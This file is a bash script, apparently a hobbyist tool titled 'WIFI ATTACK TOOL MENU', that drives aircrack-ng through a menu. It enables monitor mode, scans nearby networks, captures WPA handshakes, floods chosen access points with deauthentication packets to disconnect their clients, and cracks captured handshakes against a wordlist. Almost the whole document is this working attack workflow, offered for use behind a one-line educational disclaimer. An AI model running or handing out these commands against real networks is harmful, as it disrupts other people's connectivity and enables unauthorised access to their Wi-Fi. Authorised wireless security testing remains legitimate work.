#!/usr/bin/bash

#colore
R="\e[31m"
G="\e[32m"
Y="\e[33m"
B="\e[34m"
C="\e[36m"
E="\e[0m"

if [[ $EUID -ne 0 ]]; then
echo -e "${R}This script must be run as root${E}"
exit 1
fi
read -p "$(echo -e "${G}Is this your first time running the script? (y/n) [y = first time, n = already running in another terminal]: ${E}")" choose
if [[ $choose == y ]]; then
echo -e "${C}background function killing${E}"
airmon-ng check kill
sleep 3
echo -e "${C}background functions killed successfully${E}"
echo -e "${C}Check Wireless Interface${E}"
iwconfig
echo -e "${C}Note :- If There is no option like (wlano/wlan0mon) monitor mode not support your device use wifi Adaptor${E}"
read -p "$(echo -e "${G}Enter wireless Interface name (e.g. wlan0mon/wlan0): ${E}")" NFACE
echo -e "${C}Enabling monitor mode${E}"
airmon-ng start $NFACE
sleep 3
fi
IFACE=$(iwconfig 2>/dev/null | awk '/Mode:Monitor/ {print $1}')
if [[ -z "$IFACE" ]]; then
    echo -e "${C}No monitor mode interface found!${E}"
    echo -e "${C}First run script with option y${E}"
    exit 1
fi
echo -e "${Y}Initializing modules...${E}"
sleep 2
if ! command -v figlet &>/dev/null; then
    echo -e "${R}Figlet not installed! Installing...${E}"
    apt install figlet -y
fi
echo -e "${Y}Loading interfaces...${E}"
sleep 2
echo -e "${G}System Ready ✔${E}"
sleep 2
echo -e "${E}"
echo -e "${B}============================================================${E}"
figlet WIFI ATTACK TOOL MENU 
echo -e "${B}============================================================${E}"
echo -e "${C}        Advanced WiFi Tool"
echo -e "${B}            by thakur2309"
echo -e "${Y}=========================================="
echo -e "${G}   [*] Use for Educational Purpose Only"
echo -e "${G}   [*] Unauthorized use is illegal"
echo -e "${Y}=========================================="
echo -e "${E}"
echo -e "${B}Choose option${E}"
echo -e "${G}[1] Scan nearby networks${E}"
echo -e "${G}[2] Capture handshake${E}"
echo -e "${G}[3] Deauth devices${E}"
echo -e "${G}[4] Crack handshake${E}"
echo -e "${G}[5] Restore Network ${E}"
echo ""
read -p "$(echo -e "${Y}Choose option: ${E}")" option

if [[ $option == 1 ]]; then
    echo -e "${C}Starting scan of nearby networks...${E}"
    echo -e "${C}press Ctrl+C to stop scanning${E}"
    echo -e "${Y}For next process note Network BSSID and Channel name(CH)${E}"
    airodump-ng $IFACE
    echo -e "${C}Run this Script again Choose [2] option${E}"
elif [[ $option == 2 ]]; then
    read -p "$(echo -e "${Y}Enter BSSID: ${E}")" bssid
    read -p "$(echo -e "${Y}Enter Channel: ${E}")" channel
    echo -e "${C}Handshake capture started${E}"
    echo -e "${C}Do NOT close this terminal${E}"
    echo -e "${C}Open another terminal and run script again, then choose option [3]${E}"
    airodump-ng -c $channel --bssid $bssid -w handshake $IFACE
    

elif [[ $option == 3 ]]; then
    read -p "$(echo -e "${Y}Enter BSSID: ${E}")" bssid
    read -p "$(echo -e "${Y}Enter number of packets: ${E}")" count
    echo -e "${C}Starting disconnect devices${E}"
    aireplay-ng --deauth $count -a $bssid $IFACE
    echo -e "${C}All Device Disconnect Sucessful${E}"
elif [[ $option == 4 ]]; then
    read -p "$(echo -e "${Y}Enter wordlist path: ${E}")" wordlist
    read -p "$(echo -e "${Y}Enter handshake file: ${E}")" handshake
    aircrack-ng -w $wordlist $handshake
elif [[ $option == 5 ]]; then
    echo -e "${C}Re Checking network interface${E}"
    echo -e "${C}Restoring settings...${E}"
    airmon-ng stop $IFACE
    if command -v systemctl &>/dev/null; then
    systemctl restart NetworkManager
    echo -e "${Y}Network Restore Sucessfull${E}"
    else
    service NetworkManager restart
    echo -e "${Y}Network Restore Sucessfull${E}"
    fi
else
    echo "Invalid option"
fi
